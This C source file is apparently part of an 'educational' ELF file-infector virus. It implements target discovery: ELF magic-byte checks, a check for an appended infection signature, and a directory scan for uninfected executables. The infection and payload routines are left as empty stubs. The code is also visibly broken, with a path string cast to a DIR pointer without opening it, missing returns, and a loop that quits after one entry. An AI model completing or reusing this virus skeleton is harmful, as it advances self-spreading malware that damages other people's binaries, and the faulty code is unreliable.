/*
 * file_utilities.c
 *
 * Created on: Jan 3, 2022
 * Note: This piece of software is designed only for learning and training purposes.
 * Building a virus program with relatively ease should increase your awareness on system vulnerabilities at all times.
 */

#include "file_utilities.h"

long what_is_the_file_length(char *file_name)
{
	long length_of_file=0;
	FILE *pFile=fopen(file_name,"rb");

	if(!pFile)
	{
#ifdef DEBUGMODE
		perror("Error when creating file pointer.");
#endif
		return (-1);
	}
	else
	{
		fseek(pFile,0, SEEK_END);
		length_of_file=ftell(pFile);
		fseek(pFile,0,SEEK_SET);
	}

	fclose(pFile);
	pFile=NULL;

	return length_of_file;
}

int verify_is_elf(char *file_name)
{
	/* ==============================================================================================================================================================================
	 * A common misconception is that ELF files are just for binaries or executables. But they can be used for partial pieces (object code).
	 * Another example is shared libraries or even core dumps (those core or a.out files). The ELF specification is also used on Linux for the kernel itself and Linux kernel modules.
	 * ==============================================================================================================================================================================
	 */

	/* =================================================================================================================
	 * The first 4 hexadecimal parts define that this is an ELF file (0x45=E,0x4c=L,0x46=F), prefixed with the 0x7f value.
	 * So, the order in the ELF Header should be 0x7f, 0x45, 0x4c, 0x46
	 * ==================================================================================================================
	 */

	FILE *pFile=fopen(file_name,"rb"); // "rb" parameter goes similarly like "r", but "rb" is used for binary files as it does not provide "translation" as per the OS particulars for the end of line character "\n"

	if(!pFile)
	{
#ifdef DEBUGMODE
		perror("Error when creating the file pointer.");
#endif
		return (-1);
	}
	else
	{
		char my_buffer[4];

		int i;
		for(i=0;i<4;i++)
		{
			my_buffer[i]=fgetc(pFile);
		}

		if(my_buffer[0]==0x7f && my_buffer[1]==0x45 && my_buffer[2]==0x4c && my_buffer[3]==0x46)
		{
			return true;
		}
	}

	fclose(pFile);
	pFile=NULL;

}

int verify_if_is_infected(char *file_name, char *virus_signature,int length_of_signature )
{
	char my_buffer[length_of_signature+1]; // +1 will be added for the '\0' so to say null ending character for the string

	FILE *pFile=fopen(file_name,"rb");

	if(!pFile)
	{
#ifdef DEBUGMODE
		perror("Error when creating file pointer.");
#endif
		return (-1);
	}
	else
	{
		fseek(pFile, (length_of_signature * -1),SEEK_END);

		int i;
		for(i=0;i<length_of_signature;i++)
		{
			my_buffer[i]=fgetc(pFile);
		}

		my_buffer[length_of_signature]='\0';

		if(!strcmp(my_buffer,virus_signature))
		{
			return true; // 'true'(=1) and 'false'(=0) given to you by the power of #include <stdbool.h> :)
		}
		else
		{
			return false;
		}
	}

	fclose(pFile);
	pFile=NULL;
}

int verify_is_original_file(char *file_name, char *virus_file_name)
{
	if(!strcmp(file_name,virus_file_name))
	{
		return true;
	}
	else
	{
		return false;
	}
}

char *search_for_target(char *path_to_target_directory, char *virus_file_name, char *virus_signature, long length_of_signature)
{
	struct dirent *my_dir_struct;

	/* -----------------------------------------------------------------------------------
	 * struct dirent refers to directory entry.
	 * struct dirent
	 * {
    ino_t          d_ino;       // inode number
    off_t          d_off;       // offset to the next dirent
    unsigned short d_reclen;    // length of this record
    unsigned char  d_type;      // type of file; not supported by all file system types
    char           d_name[256]; //filename
        };
        -----------------------------------------------------------------------------------
	 */

	DIR *my_directory=path_to_target_directory;

	if(my_directory==NULL)
	{
		return NULL;
	}
	else
	{
		while((my_dir_struct=readdir(my_directory))!=NULL)
		{
			char *ptr_to_filename=my_dir_struct->d_name;
			char *string_filename=(char *) malloc ( (strlen(ptr_to_filename)+1) *sizeof(char));

			strcpy(string_filename,ptr_to_filename);

#ifdef DEBUGMODE
			printf("Hey, Alligator... Right now I am busy infecting this file \t ---> %s .\n",string_filename);
#endif

			if(!strcmp(string_filename,".") || !strcmp(string_filename,".."))
			{
				continue;
			}
			else
			{
				if(!verify_if_is_infected(string_filename, virus_signature, length_of_signature) && verify_is_elf(string_filename) && !verify_is_original_file(string_filename, virus_file_name))		{
					{
						closedir(my_directory);
						return(string_filename);
					}
				}
			}
			closedir(my_directory);
			return NULL;
		}
	}
}

	void execute_virus_mission()
	{

	}

	void stamp_the_infected_file(char *file_name, char *virus_signature)
	{

	}

	int go_infect_the_target_file(char *target_file_name,char *virus_binary_file_name, long size_of_virus, long length_of_signature)
	{

	}

	void extract_action_from_virus(char *binary_virus_filename, char *temporary_file_name, long size_of_virus, long length_of_signature)
	{

	}

	void execute_action(char *file_name, char *argv[], char *temporary_file_name, long size_of_virus, long length_of_signature)
	{

	}
